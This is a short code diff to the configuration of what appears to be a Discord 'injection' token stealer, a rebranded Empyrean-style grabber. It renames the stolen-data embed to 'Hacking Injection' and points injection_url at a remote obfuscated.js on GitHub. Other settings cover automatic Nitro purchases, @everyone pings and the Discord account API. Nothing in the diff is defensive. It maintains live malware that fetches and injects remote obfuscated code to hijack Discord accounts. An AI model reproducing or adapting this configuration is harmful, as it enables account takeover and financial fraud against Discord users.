@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Empyrean Injection', 
+  embed_name: 'Hacking Injection', 
   embed_icon: 'https://github.com/g4zzlove/HackerPc-injection/blob/main/imgs/pfp.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/g4zzlove/HackerPc-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/g4zzlove/Hacking-injection/master/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
